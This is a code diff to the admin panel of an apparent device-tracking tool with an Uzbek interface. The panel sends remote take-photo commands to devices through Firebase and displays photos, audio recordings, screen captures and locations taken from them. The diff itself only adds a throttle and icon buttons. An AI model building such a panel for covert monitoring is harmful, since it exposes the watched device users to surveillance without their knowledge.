@@ -413,10 +413,18 @@ function updateAdminMapLocation(lat, lon) {
 }
 
 // Commands
+let lastAdminTakePhotoTime = 0;
 function adminSendTakePhoto() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
+  const now = Date.now();
+  if (now - lastAdminTakePhotoTime < 3000) {
+    showToast("Iltimos, kuting... Rasm olinmoqda");
+    return;
+  }
+  lastAdminTakePhotoTime = now;
+
   const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
-  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/take_photo`).set(Date.now());
+  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/take_photo`).set(now);
   showToast(isOnline ? "Rasm olish buyrug'i yuborildi!" : "Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)");
 }
 
@@ -502,10 +510,12 @@ function renderAdminPhotos() {
       </div>
     </div>
     <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px;">
-      <div style="display: flex; gap: 6px;">
-        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevPhoto()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
-        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextPhoto()" ${idx === photos.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
-      </div>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminPrevPhoto()" ${idx === 0 ? 'disabled' : ''}>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg> Oldingi
+        </button>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminNextPhoto()" ${idx === photos.length - 1 ? 'disabled' : ''}>
+          Keyingi <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
+        </button>
       <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #16A34A; border-color: #16A34A; color: white; display: inline-flex; align-items: center; gap: 4px;" onclick="adminDownloadPhoto(${idx})">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>Saqlash
       </button>
@@ -556,8 +566,12 @@ function renderAdminAudio() {
     <audio controls src="data:audio/mp4;base64,${cur.audio_base64}" style="width: 100%; height: 38px; margin-bottom: 8px;"></audio>
     <div style="display: flex; justify-content: space-between; align-items: center;">
       <div style="display: flex; gap: 6px;">
-        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevAudio()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
-        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextAudio()" ${idx === audios.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminPrevAudio()" ${idx === 0 ? 'disabled' : ''}>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg> Oldingi
+        </button>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminNextAudio()" ${idx === audios.length - 1 ? 'disabled' : ''}>
+          Keyingi <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
+        </button>
       </div>
       <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #0D9488; border-color: #0D9488; color: white; display: inline-flex; align-items: center; gap: 4px;" onclick="adminDownloadAudio(${idx})">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>Yuklab Olish
@@ -615,8 +629,12 @@ function renderAdminScreenCapture() {
     </div>
     <div style="display: flex; justify-content: space-between; align-items: center;">
       <div style="display: flex; gap: 6px;">
-        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevScreen()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
-        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextScreen()" ${idx === screens.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminPrevScreen()" ${idx === 0 ? 'disabled' : ''}>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg> Oldingi
+        </button>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminNextScreen()" ${idx === screens.length - 1 ? 'disabled' : ''}>
+          Keyingi <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
+        </button>
       </div>
       <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #7C3AED; border-color: #7C3AED; color: white; display: inline-flex; align-items: center; gap: 4px;" onclick="adminDownloadScreen(${idx})">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>Yuklab Olish
